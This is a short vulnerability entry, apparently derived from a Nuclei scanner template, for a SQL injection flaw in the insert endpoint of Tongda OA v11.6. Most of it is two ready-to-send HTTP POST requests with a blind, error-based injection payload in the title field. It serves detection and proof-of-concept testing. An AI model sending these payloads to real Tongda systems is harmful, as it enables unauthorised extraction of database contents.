# Nuclei Template: Tongda OA v11.6 Insert Parameter - SQL Injection
**Template ID:** tongda-insert-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`tongda-insert-sqli.yaml`)

## Vulnerability Information & PoC

## Description
Tongda OA v11.6 insert parameters contain SQL injection vulnerabilities, through which attackers can obtain sensitive database information

## Steps to reproduce / Exploit Payload
```http
POST /general/document/index.php/recv/register/insert HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

title)values("'"^exp(if(ascii(substr(MOD(5,2),1,1))<128,1,710)))# =1&_SERVER=

POST /general/document/index.php/recv/register/insert HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

title)values("'"^exp(if(ascii(substr(MOD(5,2),1,1))>128,1,710)))# =1&_SERVER=
```

## References
- https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.6%20insert%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
